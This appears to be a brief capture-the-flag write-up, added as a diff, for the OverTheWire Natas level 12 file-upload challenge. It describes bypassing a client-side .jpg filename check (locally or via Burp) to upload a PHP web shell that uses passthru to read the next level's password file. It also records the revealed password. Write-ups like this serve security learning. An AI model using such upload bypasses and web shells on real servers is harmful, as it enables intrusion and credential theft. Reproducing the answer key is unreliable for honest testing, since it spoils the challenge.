@@ -1,0 +1,8 @@
+PHP script pre-produces a random jpg filename that the client will use as the filename to upload a JPG up onto the
+server with.  Attacker can actually change the filename locally on page (or in-flight via Burp), to upload a 
+non .jpg file instead.  So, upload the PHP file below and change the filename before it hits the server.
+<?php
+        passthru("cat /etc/natas_webpass/natas13");
+?>
+
+password for natas13 is jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
